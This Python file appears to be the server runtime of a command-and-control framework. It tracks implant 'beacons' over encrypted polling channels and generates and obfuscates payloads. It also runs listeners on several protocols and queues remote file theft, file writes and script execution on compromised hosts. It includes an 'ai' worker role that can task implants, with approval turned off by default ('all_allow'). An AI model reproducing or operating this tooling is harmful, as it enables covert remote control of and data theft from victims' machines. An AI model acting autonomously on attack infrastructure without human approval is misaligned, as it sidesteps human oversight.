from __future__ import annotations

import base64
import hashlib
import json
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Any

from .code_delivery import CodeDeliveryPipeline
from .file_store import FileStore, new_id, now_iso
from .listener_manager import ListenerError, ListenerManager
from .plugin_loader import PluginError, PluginLoader
from .crypto import open_seal, seal
from .proxy_manager import ProxyManager
from .task_engine import TaskEngine, TaskError

APPROVAL_DECISION_ACTIONS = {
    "approval.approve",
    "approval.reject",
    "approval.approve_all",
    "approval.reject_all",
}

READ_ONLY_ACTIONS = {
    "server.status",
    "server.config.get",
    "listener.list",
    "listener.show",
    "listener.protocols",
    "beacon.list",
    "beacon.show",
    "task.list",
    "task.show",
    "result.get",
    "plugin.list",
    "plugin.show",
    "audit.tail",
    "approval.list",
    "approval.show",
    "approval.pending",
    "server.capabilities",
    "proxy.info",
}


class RuntimeErrorBase(Exception):
    pass


class ServerRuntime:
    def __init__(self, settings):
        self.settings = settings
        self.store = FileStore(settings.data_dir)
        self.pipeline = CodeDeliveryPipeline(self.store)
        self.plugins = PluginLoader(settings.workdir)
        self.tasks = TaskEngine(self.store, self.pipeline)
        self.listeners = ListenerManager(self)
        self.proxy = ProxyManager(self)
        self.active_payloads: dict[str, dict] = {}
        self.payload_sources: dict[str, str] = {}
        self._seen_nonces: dict[str, float] = {}
        self._poll_cache: dict[tuple[str, str], tuple[float, dict]] = {}
        self._poll_cache_lock = threading.RLock()
        self._lock = threading.RLock()
        self._ensure_config()
        self._purge_payload_history()
        self._load_active_payloads()

    def _load_active_payloads(self) -> None:
        directory = self.settings.runtime_dir / "active_payloads"
        directory.mkdir(parents=True, exist_ok=True)
        for path in directory.glob("*.json"):
            try:
                data = json.loads(path.read_text(encoding="utf-8"))
                record = data.get("record") or {}
                source = data.get("source") or ""
                token = record.get("token")
                payload_id = record.get("id")
                if token and payload_id:
                    self.active_payloads[token] = record
                    self.payload_sources[payload_id] = source
            except Exception:
                continue

    def _persist_active_payload(self, token: str, record: dict, source: str) -> None:
        directory = self.settings.runtime_dir / "active_payloads"
        directory.mkdir(parents=True, exist_ok=True)
        path = directory / f"{token}.json"
        tmp = path.with_suffix(".tmp")
        tmp.write_text(json.dumps({"record": record, "source": source}, ensure_ascii=False), encoding="utf-8")
        try:
            tmp.chmod(0o600)
        except OSError:
            pass
        tmp.replace(path)
        try:
            path.chmod(0o600)
        except OSError:
            pass

    def _purge_payload_history(self) -> None:
        # Payload history was intentionally removed. Purge legacy on-disk
        # payload records, but never touch active in-memory payloads.
        import shutil
        payloads_dir = self.settings.data_dir / "payloads"
        if payloads_dir.exists():
            shutil.rmtree(payloads_dir, ignore_errors=True)
        for path in (self.settings.data_dir / "beacons").glob("*/payload.json*"):
            try:
                path.unlink()
            except OSError:
                pass

    def _ensure_config(self) -> None:
        config = self.store.read_json("config.json", default={})
        if not config:
            config = {"approval_mode": "all_allow", "workdir": str(self.settings.workdir)}
            self.store.write_json("config.json", config)

    @property
    def approval_mode(self) -> str:
        return str(self.store.read_json("config.json", default={}).get("approval_mode", "all_allow"))

    def set_approval_mode(self, mode: str) -> str:
        if mode not in {"all_allow", "per_action"}:
            raise RuntimeErrorBase("approval_mode must be all_allow or per_action")
        self.store.update_json("config.json", lambda cfg: {**cfg, "approval_mode": mode})
        self.store.event("config.approval_mode", {"mode": mode}, actor="client")
        return mode

    # ------------------------------------------------------------------
    # Beacon / implant transport
    # ------------------------------------------------------------------
    def _payload_for_token(self, token: str) -> dict:
        record = self.active_payloads.get(token)
        if not record:
            raise RuntimeErrorBase("unknown or expired payload token")
        return record

    def _touch_beacon(self, beacon: dict, payload: dict, protocol: str, heartbeat_data: dict | None = None) -> dict:
        beacon_id = payload["beacon_id"]
        rel = f"beacons/{beacon_id}/beacon.json"
        current = self.store.read_json(rel, default={})
        now = now_iso()
        heartbeat = heartbeat_data or beacon.get("heartbeat") or {}
        reactivated = bool(current.get("removed"))
        was_recent = False
        try:
            previous_seen = datetime.fromisoformat(str(current.get("last_seen", "")))
            was_recent = (datetime.now(previous_seen.tzinfo) - previous_seen).total_seconds() <= max(30.0, float(current.get("heartbeat_slow") or 600) * 2.0)
        except Exception:
            was_recent = False
        current.update(
            {
                "id": beacon_id,
                "hostname": beacon.get("hostname", current.get("hostname", "unknown")),
                "platform": beacon.get("platform", current.get("platform", "unknown")),
                "username": beacon.get("username", current.get("username", "")),
                "python_version": beacon.get("python_version", current.get("python_version", "")),
                "cwd": beacon.get("cwd", current.get("cwd", "")),
                "protocol": protocol,
                "status": "online",
                "removed": False,
                "listener_id": payload.get("listener_id"),
                "payload_id": payload.get("id"),
                "first_seen": current.get("first_seen", now),
                "last_seen": now,
                "heartbeat": heartbeat,
                "heartbeat_interval": heartbeat.get("current"),
                "heartbeat_fast": heartbeat.get("fast_interval"),
                "heartbeat_slow": heartbeat.get("slow_interval"),
                "heartbeat_jitter": heartbeat.get("jitter"),
                "result_finish_delay": heartbeat.get("finish_delay"),
                "heartbeat_idle_rounds": heartbeat.get("idle_rounds"),
                "heartbeat_dispatch_total": heartbeat.get("dispatch_total"),
                "heartbeat_failures": heartbeat.get("failures"),
                "next_poll_at": heartbeat.get("next_poll_at"),
                "max_concurrent_tasks": heartbeat.get("max_concurrent_tasks", current.get("max_concurrent_tasks", 8)),
                "reactivation_count": int(current.get("reactivation_count", 0)) + (1 if reactivated else 0),
                "last_reactivated_at": now if reactivated else current.get("last_reactivated_at"),
                "settings": {
                    "fast_interval": heartbeat.get("fast_interval", current.get("settings", {}).get("fast_interval", 5)),
                    "slow_interval": heartbeat.get("slow_interval", current.get("settings", {}).get("slow_interval", 600)),
                    "finish_delay": heartbeat.get("finish_delay", current.get("settings", {}).get("finish_delay", 5)),
                    "jitter": heartbeat.get("jitter", current.get("settings", {}).get("jitter", 0.2)),
                    "max_concurrent_tasks": heartbeat.get("max_concurrent_tasks", current.get("settings", {}).get("max_concurrent_tasks", 8)),
                },
            }
        )
        self.store.write_json(rel, current)
        if not was_recent:
            auto_tasks = self._auto_tasks_for_beacon(beacon_id)
            if auto_tasks:
                self.tasks.arm_auto_sequence(beacon_id, auto_tasks)
        return current

    def _payload_key(self, payload: dict, client_public: str = "") -> bytes:
        if payload.get("dh_prime") and payload.get("dh_private"):
            prime = int(payload["dh_prime"])
            client_value = int(client_public or payload.get("client_pub") or 0)
            if client_value <= 1 or client_value >= prime - 1:
                raise RuntimeErrorBase("invalid DH client public value")
            bound = str(payload.get("client_pub") or "")
            if bound and int(bound) != client_value:
                beacon = self.store.read_json(f"beacons/{payload.get('beacon_id', '')}/beacon.json", default={})
                allow_rekey = False
                try:
                    seen = datetime.fromisoformat(str(beacon.get("last_seen", "")))
                    allow_rekey = (datetime.now(seen.tzinfo) - seen).total_seconds() > max(30.0, float(beacon.get("heartbeat_slow") or 600) * 2.0)
                except Exception:
                    allow_rekey = True
                if not allow_rekey:
                    raise RuntimeErrorBase("DH client public value changed")
                payload["rekey_count"] = int(payload.get("rekey_count", 0)) + 1
                payload["previous_client_pub"] = bound
                self.store.event("payload.rekeyed", {"payload_id": payload.get("id"), "beacon_id": payload.get("beacon_id")})
            if not bound or int(bound) != client_value:
                payload["client_pub"] = str(client_value)
                self._persist_active_payload(payload["token"], payload, self.payload_sources.get(payload["id"], ""))
            shared = pow(client_value, int(payload["dh_private"]), prime)
            return hashlib.sha256(
                str(shared).encode("ascii") + b"pyexec2-dh-v1" + str(payload.get("beacon_id", "")).encode("utf-8")
            ).digest()
        # Backward compatibility for payloads generated before DH support.
        return base64.b64decode(payload["key_b64"])

    POLL_CACHE_TTL = 60.0
    POLL_CACHE_MAX = 512

    def _poll_cache_get(self, key: tuple[str, str]) -> dict | None:
        now = time.time()
        with self._poll_cache_lock:
            cached = self._poll_cache.get(key)
            if cached and now - cached[0] <= self.POLL_CACHE_TTL:
                return cached[1]
            if cached:
                self._poll_cache.pop(key, None)
        return None

    def _poll_cache_put(self, key: tuple[str, str], response: dict) -> None:
        with self._poll_cache_lock:
            self._poll_cache[key] = (time.time(), response)
            if len(self._poll_cache) > self.POLL_CACHE_MAX:
                oldest = min(self._poll_cache.items(), key=lambda item: item[1][0])[0]
                self._poll_cache.pop(oldest, None)

    def transport_poll(self, request: dict) -> dict:
        token = request.get("payload_token", "")
        payload = self._payload_for_token(token)
        key = self._payload_key(payload, str(request.get("client_pub", "")))
        sealed = base64.b64decode(request["data"])
        raw = open_seal(key, sealed, b"pyexec2-implant")
        inner = json.loads(raw.decode("utf-8"))
        request_id = str(inner.get("request_id") or "")
        cache_key = (str(payload.get("token", token)), request_id) if request_id else None
        if payload.get("replay_protection"):
            now = time.time()
            sent_at = float(inner.get("sent_at", 0) or 0)
            nonce = str(inner.get("nonce", ""))
            if abs(now - sent_at) > 300 or not nonce:
                raise RuntimeErrorBase("poll timestamp invalid")
            with self._lock:
                self._seen_nonces = {key: value for key, value in self._seen_nonces.items() if now - value <= 600}
                if nonce in self._seen_nonces:
                    raise RuntimeErrorBase("poll replay detected")
                self._seen_nonces[nonce] = now
        beacon = self._touch_beacon(inner.get("beacon", {}), payload, inner.get("protocol", payload.get("protocol", "")), inner.get("heartbeat"))
        if cache_key:
            cached = self._poll_cache_get(cache_key)
            if cached is not None:
                return cached
        task_ack = [str(item) for item in (inner.get("task_ack") or []) if item]
        if task_ack:
            self.tasks.ack_tasks(payload["beacon_id"], task_ack)
        ack_results = []
        upgrade_requests = []
        for result in inner.get("results", []):
            task_id = result.get("task_id")
            if not task_id:
                continue
            result_id = result.get("result_id") or task_id
            try:
                if result.get("kind") == "result_chunk":
                    self.tasks.record_result_chunk(
                        task_id,
                        int(result.get("chunk_index", 0)),
                        int(result.get("chunk_total", 1)),
                        str(result.get("chunk_b64", "")),
                        str(result.get("chunk_hash", "")),
                    )
                else:
                    data = result.get("data")
                    self.tasks.record_result(
                        task_id,
                        output=str(result.get("output", "")),
                        error=str(result.get("error", "")),
                        data=data,
                    )
                    if isinstance(data, dict) and isinstance(data.get("upgrade"), dict):
                        upgrade_requests.append(data["upgrade"])
                ack_results.append(result_id)
            except TaskError:
                continue
        limit = max(1, min(int(beacon.get("max_concurrent_tasks", 8)), 64))
        tasks = self.tasks.claim_tasks(payload["beacon_id"], limit=limit)
        auto_mode = self.tasks.auto_mode(payload["beacon_id"])
        response = {
            "kind": "poll_result",
            "request_id": request_id,
            "ack_results": ack_results,
            "tasks": tasks,
            "dispatch_count": len(tasks),
            "auto_mode": auto_mode,
            "server_time": now_iso(),
        }
        if auto_mode:
            response["interval_hint"] = 2
        if upgrade_requests:
            response["upgrade_apply"] = True
        sealed_response = seal(key, json.dumps(response, ensure_ascii=False).encode("utf-8"), b"pyexec2-server")
        response_outer = {"data": base64.b64encode(sealed_response).decode("ascii")}
        if cache_key:
            self._poll_cache_put(cache_key, response_outer)
        # The response above is sealed with the old key. Only after it is
        # sealed do we rotate the active payload token/key on the server.
        for upgrade in upgrade_requests:
            self._apply_payload_upgrade(payload, upgrade)
        return response_outer

    def _apply_payload_upgrade(self, payload: dict, upgrade: dict) -> None:
        old_token = str(payload.get("token", ""))
        new_token = str(upgrade.get("token") or old_token)
        key_value = upgrade.get("key")
        if key_value:
            try:
                raw_key = base64.b64decode(str(key_value))
                if len(raw_key) == 32:
                    payload["key_b64"] = base64.b64encode(raw_key).decode("ascii")
                    payload.pop("dh_prime", None)
                    payload.pop("dh_private", None)
                    payload.pop("dh_server_pub", None)
                    payload.pop("client_pub", None)
            except Exception:
                return
        if new_token != old_token:
            payload["token"] = new_token
            self.active_payloads.pop(old_token, None)
            old_path = self.settings.runtime_dir / "active_payloads" / f"{old_token}.json"
            try:
                old_path.unlink(missing_ok=True)
            except OSError:
                pass
        self.active_payloads[new_token] = payload
        self._persist_active_payload(new_token, payload, self.payload_sources.get(payload.get("id"), ""))
        self.store.event("payload.upgraded", {"payload_id": payload.get("id"), "beacon_id": payload.get("beacon_id"), "token_changed": new_token != old_token, "key_changed": bool(key_value)})

    def payload_by_token(self, token: str) -> dict:
        return self._payload_for_token(token)

    def _beacon_status(self, record: dict) -> dict:
        item = dict(record)
        if item.get("removed"):
            item["status"] = "removed"
            return item
        try:
            seen = datetime.fromisoformat(str(item.get("last_seen", "")))
            age = (datetime.now(seen.tzinfo) - seen).total_seconds()
            slow = float(item.get("heartbeat_slow") or 600)
            if age > max(30.0, slow * 2.0):
                item["status"] = "offline"
        except Exception:
            if item.get("status") == "online" and not item.get("last_seen"):
                item["status"] = "offline"
        return item

    def _expire_stale_beacons(self) -> None:
        now = datetime.now().astimezone()
        for directory in self.store.list_dirs("beacons"):
            record = self.store.read_json(f"beacons/{directory.name}/beacon.json")
            if not record or record.get("removed"):
                continue
            try:
                seen = datetime.fromisoformat(str(record.get("last_seen", "")))
                if (now - seen).total_seconds() > 86400:
                    record["removed"] = True
                    record["removed_at"] = now_iso()
                    record["status"] = "removed"
                    self.store.write_json(f"beacons/{directory.name}/beacon.json", record)
                    self.store.event("beacon.expired", {"beacon_id": record.get("id"), "last_seen": record.get("last_seen")})
            except Exception:
                continue

    def _beacon_order(self) -> list[str]:
        record = self.store.read_json("beacon_order.json", default={"order": []})
        return [str(item) for item in record.get("order", [])]

    def list_beacons(self, include_removed: bool = False) -> list[dict]:
        self._expire_stale_beacons()
        out = []
        for directory in self.store.list_dirs("beacons"):
            record = self.store.read_json(f"beacons/{directory.name}/beacon.json")
            if record:
                if record.get("removed") and not include_removed:
                    continue
                out.append(self._beacon_status(record))
        order = self._beacon_order()
        order_index = {beacon_id: index for index, beacon_id in enumerate(order)}
        def first_seen_timestamp(item):
            try:
                return datetime.fromisoformat(str(item.get("first_seen") or "")).timestamp()
            except Exception:
                # Legacy records without first_seen must not fall back to
                # last_seen here: last_seen changes on every heartbeat and
                # would make unlisted rows move while an operator is watching.
                return 0.0
        # Newly discovered Beacons that are not in the saved manual order are
        # shown first, newest discovery first. Use first_seen, not last_seen,
        # so heartbeats never reorder rows. Once an operator drags them into
        # the saved order, the existing manual ordering is preserved.
        out.sort(key=lambda item: (
            0 if item.get("id") not in order_index else 1,
            -first_seen_timestamp(item) if item.get("id") not in order_index else order_index[item.get("id")],
            str(item.get("id", "")),
        ))
        return out

    def get_beacon(self, beacon_id: str) -> dict:
        record = self.store.read_json(f"beacons/{beacon_id}/beacon.json")
        if not record:
            raise RuntimeErrorBase(f"beacon not found: {beacon_id}")
        return self._beacon_status(record)

    # ------------------------------------------------------------------
    # Client actions
    # ------------------------------------------------------------------
    async def handle_action(self, action: str, args: dict | None = None, actor: str = "human", origin: str = "web") -> dict:
        args = args or {}
        if actor not in {"human", "ai", "ai_approval"}:
            return {"status": "error", "error": "unknown actor role"}
        if action in APPROVAL_DECISION_ACTIONS and actor not in {"human", "ai_approval"}:
            return {"status": "error", "error": "approval token required for approval decisions"}
        # Humans always bypass approval policy. AI worker and AI approver
        # actions remain governed by all-allow vs per-action approval.
        if actor in {"ai", "ai_approval"} and self.approval_mode == "per_action" and action not in READ_ONLY_ACTIONS and not action.startswith("approval."):
            approval = self._create_approval(action, args, actor)
            return {"status": "approval_required", "approval": approval}
        try:
            result = await self._dispatch(action, args, actor=actor)
            self.store.event("action.completed", {"action": action, "args": args, "actor": actor, "origin": origin}, actor=actor)
            return {"status": "ok", "data": result}
        except Exception as exc:
            self.store.event("action.failed", {"action": action, "args": args, "error": str(exc), "actor": actor, "origin": origin}, actor=actor)
            return {"status": "error", "error": str(exc) or "operation failed"}

    async def _dispatch(self, action: str, args: dict, actor: str = "human") -> Any:
        if action == "server.status":
            return {
                "workdir": str(self.settings.workdir),
                "token_file": str(self.settings.token_file),
                "approval_mode": self.approval_mode,
                "beacons": len(self.list_beacons()),
                "listeners": len(self.listeners.list()),
                "tasks": len(self.tasks.list_tasks(limit=1000)),
                "protocols": self.listeners.protocols(),
                "plugins": len(self.plugins.list()),
            }
        if action == "server.capabilities":
            actions = sorted([
                "approval.approve", "approval.approve_all", "approval.list", "approval.pending", "approval.reject",
                "approval.reject_all", "approval.show", "audit.tail", "beacon.list", "beacon.show", "file.download",
                "file.list", "file.read", "file.upload", "file.write", "listener.create", "listener.list",
                "listener.delete", "listener.protocols", "listener.remove", "listener.restart", "listener.show", "listener.start", "listener.stop",
                "auto.global.get", "auto.global.set", "beacon.auto.run", "beacon.auto.set", "beacon.clear", "beacon.note", "beacon.settings", "beacon.stash",
                "group.batch_dispatch", "group.create", "group.delete", "group.list", "group.update",
                "payload.generate", "plugin.create", "plugin.delete", "plugin.list", "plugin.reload",
                "plugin.save", "plugin.show", "protocol.upgrade", "proxy.info", "proxy.start", "proxy.stop",
                "file.upload_chunk", "payload.obfuscate", "result.get", "script.run", "server.capabilities", "server.config.get", "server.config.set",
                "server.report", "server.status", "task.cancel", "task.create", "task.list", "task.show",
            ])
            return {
                "actions": actions,
                "read_only_actions": sorted(READ_ONLY_ACTIONS),
                "approval_mode": self.approval_mode,
                "approval_exempt_prefix": "approval.",
                "note": "Human token bypasses approval policy; AI token is subject to approval mode.",
                "roles": {
                    "human": "Web/local operator token; always allowed without approval.",
                    "ai": "AI worker token; governed by all_allow or per_action and cannot decide approvals.",
                    "ai_approval": "AI approval token; can approve/reject AI operations.",
                },
            }
        if action == "server.config.get":
            return {"approval_mode": self.approval_mode}
        if action == "server.config.set":
            return {"approval_mode": self.set_approval_mode(str(args.get("approval_mode", "all_allow")))}
        if action == "server.report":
            module = self.plugins.load_module("server", "server_report")
            handler = getattr(module, "handle", None)
            if not callable(handler):
                raise RuntimeErrorBase("server_report has no handle(runtime,args)")
            return handler(self, args)
        if action == "listener.protocols":
            return self.listeners.protocols()
        if action == "listener.create":
            return await self.listeners.create(
                protocol=str(args.get("protocol", "udp")),
                host=str(args.get("host", "0.0.0.0")),
                port=int(args.get("port", 0)),
                public_host=str(args.get("public_host", args.get("host", "127.0.0.1"))),
                options=args.get("options") or {},
            )
        if action == "listener.list":
            return self.listeners.list()
        if action == "listener.show":
            return self.listeners.get(str(args.get("listener_id", "")))
        if action == "listener.start":
            return await self.listeners.start(str(args.get("listener_id", "")))
        if action == "listener.restart":
            return await self.listeners.restart(str(args.get("listener_id", "")))
        if action == "listener.stop":
            return await self.listeners.stop(str(args.get("listener_id", "")))
        if action in {"listener.remove", "listener.delete"}:
            return await self.listeners.remove(str(args.get("listener_id", "")))
        if action == "auto.global.get":
            return {"tasks": self._global_auto_tasks()}
        if action == "auto.global.set":
            return self._set_global_auto(args)
        if action == "group.list":
            return self._list_groups()
        if action == "group.create":
            return self._create_group(args)
        if action == "group.update":
            return self._update_group(args)
        if action == "group.delete":
            return self._delete_group(str(args.get("group_id", "")))
        if action == "group.batch_dispatch":
            return self._batch_dispatch_group(args)
        if action == "beacon.auto.set":
            return self._set_beacon_auto(args)
        if action == "beacon.auto.run":
            return self._run_beacon_auto(args)
        if action == "payload.generate":
            return self.runtime_payload_generate(args)
        if action == "payload.obfuscate":
            return self.runtime_payload_obfuscate(args)
        if action == "beacon.list":
            return self.list_beacons(include_removed=bool(args.get("include_removed", False)))
        if action == "beacon.show":
            return self.get_beacon(str(args.get("beacon_id", "")))
        if action == "beacon.stop_queue":
            return self.tasks.purge_queued(str(args.get("beacon_id", "")))
        if action == "beacon.order.set":
            order = list(dict.fromkeys(str(item) for item in (args.get("beacon_ids") or []) if str(item)))
            self.store.write_json("beacon_order.json", {"order": order, "updated_at": now_iso()})
            self.store.event("beacon.order_updated", {"count": len(order)})
            return {"order": order}
        if action == "beacon.settings":
            return self._beacon_settings(args)
        if action == "beacon.note":
            return self._beacon_note(args)
        if action == "beacon.stash":
            return self._beacon_stash(args)
        if action in {"beacon.clear", "beacon.clear_all"}:
            return self._beacon_clear()
        if action == "task.create":
            return self._task_create(args)
        if action == "task.list":
            return self.tasks.list_tasks(beacon_id=args.get("beacon_id"))
        if action == "task.show":
            return self.tasks.get_task(str(args.get("task_id", "")))
        if action == "task.cancel":
            return self.tasks.cancel_task(str(args.get("task_id", "")))
        if action == "result.get":
            return self.tasks.get_task(str(args.get("task_id", "")))
        if action == "script.run":
            return self._script_run(args)
        if action == "file.list":
            beacon_id = str(args.get("beacon_id", ""))
            plugin = self._platform_plugin(beacon_id, "lls", "wls")
            return self._queue_file_task(args, plugin, {"path": args.get("path", ".")})
        if action == "file.read":
            beacon_id = str(args.get("beacon_id", ""))
            plugin = self._platform_plugin(beacon_id, "lcat", "wcat")
            return self._queue_file_task(args, plugin, {"path": args.get("path", ""), "offset": args.get("offset", 0), "length": args.get("length", 4 * 1024 * 1024)})
        if action == "file.write":
            beacon_id = str(args.get("beacon_id", ""))
            plugin = self._platform_plugin(beacon_id, "ltee", "wtee")
            return self._queue_file_task(args, plugin, {"path": args.get("path", ""), "content": args.get("content", ""), "content_b64": args.get("content_b64"), "mode": args.get("mode", "overwrite")})
        if action == "file.download":
            beacon_id = str(args.get("beacon_id", ""))
            plugin = self._platform_plugin(beacon_id, "ldd", "wdd")
            return self._queue_file_task(args, plugin, {"op": "read", "path": args.get("path", ""), "offset": args.get("offset", 0), "length": args.get("length", 1024 * 1024)})
        if action == "file.upload":
            return self._upload_file(args)
        if action == "file.upload_chunk":
            return self._upload_chunk(args)
        if action == "plugin.list":
            return self.plugins.list(kind=args.get("kind"), include_source=bool(args.get("include_source")))
        if action == "plugin.show":
            kind = str(args.get("kind", "implant"))
            name = str(args.get("name", ""))
            source = self.plugins.read_source(kind, name)
            return {"kind": kind, "name": name, "source": source}
        if action == "plugin.create":
            return self.plugins.create(
                str(args.get("kind", "implant")),
                str(args.get("name", "")),
                source=args.get("source"),
                command=str(args.get("command", "")),
                overwrite=bool(args.get("overwrite", False)),
                platform=str(args.get("platform", "")),
            )
        if action == "plugin.save":
            return self.plugins.save_source(str(args.get("kind", "implant")), str(args.get("name", "")), str(args.get("source", "")))
        if action == "plugin.delete":
            return self.plugins.delete(str(args.get("kind", "implant")), str(args.get("name", "")))
        if action == "plugin.reload":
            return self.plugins.reload(str(args.get("kind", "implant")), str(args.get("name", "")))
        if action == "audit.tail":
            return self.store.recent_events(limit=int(args.get("limit", 200)))
        if action == "proxy.info":
            return self.proxy.info()
        if action == "proxy.start":
            await self.proxy.start()
            data = self.proxy.info()
            data["status"] = "started"
            return data
        if action == "proxy.stop":
            await self.proxy.stop()
            data = self.proxy.info()
            data["status"] = "stopped"
            return data
        if action == "protocol.upgrade":
            beacon_id = str(args.get("beacon_id", ""))
            self.get_beacon(beacon_id)
            target = str(args.get("protocol", ""))
            if target not in {"tcp", "udp", "http", "https", "dns"}:
                raise RuntimeErrorBase("unsupported protocol")
            payload = {"protocol": target, "host": args.get("host", ""), "port": args.get("port")}
            for key in ("url", "token", "key"):
                if args.get(key):
                    payload[key] = args[key]
            return self.tasks.create_control_task(beacon_id, "protocol_switch", payload)
        if action == "approval.list":
            return self._list_approvals(status=args.get("status"))
        if action == "approval.pending":
            return self._list_approvals(status="pending")
        if action == "approval.show":
            approval_id = str(args.get("approval_id", ""))
            record = self.store.read_json(f"approvals/{approval_id}.json")
            if not record:
                raise RuntimeErrorBase("approval not found")
            return record
        if action == "approval.approve":
            return await self._approve_approval(str(args.get("approval_id", "")), actor)
        if action == "approval.reject":
            return self._reject_approval(
                str(args.get("approval_id", "")),
                suggestion=str(args.get("suggestion", args.get("reason", "")) or "").strip(),
                actor=actor,
            )
        if action == "approval.approve_all":
            return await self._approve_all_approvals(actor)
        if action == "approval.reject_all":
            return self._reject_all_approvals()
        raise RuntimeErrorBase(f"unknown action: {action}")

    def runtime_payload_generate(self, args: dict) -> dict:
        from .payload_builder import PayloadBuilder

        builder = PayloadBuilder(self)
        return builder.generate(
            listener_id=str(args.get("listener_id", "")),
            name=str(args.get("name", "单阶段载荷")),
            public_url=args.get("public_url"),
            fast_interval=float(args.get("fast_interval", 5.0)),
            slow_interval=float(args.get("slow_interval", 600.0)),
            finish_delay=float(args.get("finish_delay", 5.0)),
            jitter=float(args.get("jitter", 0.2)),
            max_concurrent_tasks=int(args.get("max_concurrent_tasks", 8)),
            initial_interval=float(args.get("initial_interval", args.get("fast_interval", 5.0))),
        )

    def runtime_payload_obfuscate(self, args: dict) -> dict:
        from .payload_builder import PayloadBuilder

        return PayloadBuilder(self).obfuscate(
            str(args.get("payload_id", "")),
            method=str(args.get("method", "direct_echo")),
            enabled=bool(args.get("enabled", True)),
        )

    def payload_source(self, payload_id: str, variant: str = "normal") -> str:
        if variant == "obfuscated":
            for candidate in self.active_payloads.values():
                if candidate.get("id") == payload_id and candidate.get("_obfuscated_launcher"):
                    return str(candidate["_obfuscated_launcher"])
            raise RuntimeErrorBase("obfuscated payload expired or not found")
        source = self.payload_sources.get(payload_id)
        if source is None:
            for candidate in self.active_payloads.values():
                if candidate.get("id") == payload_id and candidate.get("_normal_launcher"):
                    return str(candidate["_normal_launcher"])
            raise RuntimeErrorBase("payload expired or not found")
        return source

    def _beacon_clear(self) -> dict:
        removed = 0
        for directory in self.store.list_dirs("beacons"):
            self.store.delete(f"beacons/{directory.name}")
            removed += 1
        # Prevent existing payload tokens from recreating cleared Beacons.
        for path in (self.settings.runtime_dir / "active_payloads").glob("*.json"):
            try:
                path.unlink()
            except OSError:
                pass
        self.active_payloads.clear()
        self.payload_sources.clear()
        self.store.write_json("beacon_order.json", {"order": [], "updated_at": now_iso()})
        # Remove pending queue files and cancel unfinished task records.
        for directory in list(self.store.list_dirs("queues")):
            self.store.delete(f"queues/{directory.name}")
        cancelled = 0
        for task in self.tasks.list_tasks(limit=100000):
            if task.get("status") in {"queued", "dispatched", "cancel_requested"}:
                record = self.store.read_json(f"tasks/{task['id']}/task.json", default={})
                if record:
                    record["status"] = "cancelled"
                    record["error"] = "beacon fleet cleared"
                    record["finished_at"] = now_iso()
                    self.store.write_json(f"tasks/{task['id']}/task.json", record)
                    cancelled += 1
        self.store.event("beacon.fleet_cleared", {"removed": removed, "cancelled_tasks": cancelled}, actor="human")
        return {"removed": removed, "cancelled_tasks": cancelled, "active_payloads_cleared": True}

    def _beacon_stash(self, args: dict) -> dict:
        beacon_id = str(args.get("beacon_id", ""))
        record = self.get_beacon(beacon_id)
        record["stashed"] = bool(args.get("stashed", True))
        record["stashed_at"] = now_iso() if record["stashed"] else None
        self.store.write_json(f"beacons/{beacon_id}/beacon.json", record)
        self.store.event("beacon.stash_changed", {"beacon_id": beacon_id, "stashed": record["stashed"]}, actor="human")
        return {"id": beacon_id, "stashed": record["stashed"], "stashed_at": record.get("stashed_at")}

    def _beacon_note(self, args: dict) -> dict:
        beacon_id = str(args.get("beacon_id", ""))
        record = self.get_beacon(beacon_id)
        note = str(args.get("note", ""))
        record["note"] = note
        record["note_updated_at"] = now_iso()
        self.store.write_json(f"beacons/{beacon_id}/beacon.json", record)
        self.store.event("beacon.note_updated", {"beacon_id": beacon_id, "note": note}, actor="human")
        return {"id": beacon_id, "note": note, "note_updated_at": record["note_updated_at"]}

    def _beacon_settings(self, args: dict) -> dict:
        beacon_id = str(args.get("beacon_id", ""))
        record = self.get_beacon(beacon_id)
        raw = args.get("settings") or {}
        current = record.get("settings") or {}
        fast = max(1.0, min(float(raw.get("fast_interval", current.get("fast_interval", 5))), 600.0))
        slow = max(fast, min(float(raw.get("slow_interval", current.get("slow_interval", 600))), 3600.0))
        finish = max(0.0, min(float(raw.get("finish_delay", current.get("finish_delay", 5))), 300.0))
        jitter = max(0.0, min(float(raw.get("jitter", current.get("jitter", 0.2))), 0.9))
        concurrency = max(1, min(int(raw.get("max_concurrent_tasks", current.get("max_concurrent_tasks", 8))), 64))
        interval = float(raw.get("current_interval", record.get("heartbeat_interval") or fast))
        interval = max(fast, min(slow, interval))
        settings = {
            "fast_interval": fast,
            "slow_interval": slow,
            "finish_delay": finish,
            "jitter": jitter,
            "max_concurrent_tasks": concurrency,
            "current_interval": interval,
        }
        record.update({
            "settings": settings,
            "heartbeat_fast": fast,
            "heartbeat_slow": slow,
            "heartbeat_jitter": jitter,
            "result_finish_delay": finish,
            "max_concurrent_tasks": concurrency,
            "heartbeat_interval": interval,
        })
        self.store.write_json(f"beacons/{beacon_id}/beacon.json", record)
        task = self.tasks.create_control_task(beacon_id, "set_runtime_settings", settings)
        return {"task": task, "settings": settings}

    def _require_online_beacon(self, beacon_id: str) -> dict:
        record = self.get_beacon(beacon_id)
        if record.get("status") != "online":
            raise RuntimeErrorBase(f"beacon is {record.get('status', 'offline')}; task not dispatched until heartbeat returns")
        return record

    def _task_create(self, args: dict) -> dict:
        beacon_id = str(args.get("beacon_id", ""))
        self._require_online_beacon(beacon_id)
        plugin = str(args.get("plugin", ""))
        return self.tasks.create_task(
            beacon_id,
            plugin=plugin,
            mode=str(args.get("mode", "plugin")),
            source=args.get("source"),
            args=args.get("args") or {},
            source_type=str(args.get("source_type", "plugin")),
            risk=str(args.get("risk", "R1")),
            display=str(args.get("display", plugin)),
        )

    def _script_run(self, args: dict) -> dict:
        beacon_id = str(args.get("beacon_id", ""))
        self._require_online_beacon(beacon_id)
        return self.tasks.create_script_task(beacon_id, str(args.get("source", "")), args.get("args") or {})

    def _platform_plugin(self, beacon_id: str, linux_plugin: str, windows_plugin: str) -> str:
        beacon = self.get_beacon(beacon_id)
        return windows_plugin if str(beacon.get("platform", "")).lower() == "windows" else linux_plugin

    def _queue_file_task(self, args: dict, plugin: str, plugin_args: dict) -> dict:
        beacon_id = str(args.get("beacon_id", ""))
        self._require_online_beacon(beacon_id)
        return self.tasks.create_task(beacon_id, plugin=plugin, args=plugin_args, risk="R2", display=plugin)

    def _upload_chunk(self, args: dict) -> dict:
        beacon_id = str(args.get("beacon_id", ""))
        self._require_online_beacon(beacon_id)
        path = str(args.get("path", ""))
        offset = int(args.get("offset", 0))
        b64 = str(args.get("content_b64", ""))
        mode = str(args.get("mode", "write"))
